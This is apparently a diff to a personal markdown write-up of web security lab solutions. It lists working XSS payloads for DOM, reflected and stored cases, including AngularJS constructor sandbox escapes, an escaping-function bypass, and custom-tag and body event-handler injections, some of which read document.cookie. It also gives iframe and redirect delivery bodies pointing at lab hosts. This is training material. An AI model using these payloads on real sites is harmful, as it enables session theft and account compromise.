@@ -69,3 +69,83 @@ Characters `'` are not encoded by
 ```
 ?search='; alert(1); var x='
 ```
+
+## DOM XSS in document.write sink using source location.search inside a select element
+
+```
+/product?productId=2&storeId=</option></select><img src=X onerror=alert(1)>
+```
+
+## DOM XSS in AngularJS expression with angle brackets and double quotes HTML-encoded
+
+`ng-app` attr in body
+
+Search for `{{2+2}}` retrieves with `{{2+2}}` in page source, but on website is visible as `4`, because of `ng-app` which executes this.
+
+```
+{{$on.constructor('alert(1)')()}}
+
+{{$eval.constructor('alert(1)')()}}
+```
+
+The only thing we care about is to get to `Function` constructor, create function with it and call it. Since `$eval` and `$on` are functions in scope of angular we can use them.
+
+## Reflected DOM XSS
+
+Search:
+```
+\"}; alert(1); // -
+```
+
+Search term is passed with result to eval function
+
+## Stored DOM XSS
+
+Escaping function:
+```
+function escapeHTML(html) {
+    return html.replace('<', '&lt;').replace('>', '&gt;');
+}
+```
+
+Testing this:
+```
+"<><><>".replace('<', '&lt;').replace('>', '&gt;')
+```
+
+Results in:
+```
+"&lt;&gt;<><>"
+```
+
+Create a comment with body:
+```
+<><img src=X onerror=alert(document.domain)>
+```
+
+## Reflected XSS into HTML context with most tags and attributes blocked
+
+Fuzz all posiible tags, to test which one could be used. `<body>` and custom tags (like for eg. `<xss>`) are accepted.
+
+Fuzz all possible events. `onresize` is accepted.
+
+It turns out that new body is not injected, but the main one inherits the attributes of the new one. So searching for `<body onresize=print()></body>` will add `onresize=print()` to main body.
+
+Deliver with body:
+```
+<iframe src=https://0ac9008903e8dd708000c1ac00020078.web-security-academy.net/?search=%3cbody+onresize%3dprint()%3e%3c%2fbody%3e onload=this.style.width="100px"></iframe>
+```
+
+## Reflected XSS into HTML context with all tags blocked except custom ones
+
+XSS with custom tag:
+```
+<xss autofocus tabindex=1 onfocusin=alert(document.cookie) style="display: block">a</xss>
+```
+
+Deliver body:
+```
+<script>
+    location = "https://0a66005c0464b19d8b41541a007d004d.web-security-academy.net/?search=%3Cxss+autofocus+tabindex%3D1+onfocusin%3Dalert%28document.cookie%29+style%3D%22display%3A+block%22%3Ea%3C%2Fxss%3E"
+</script>
+```
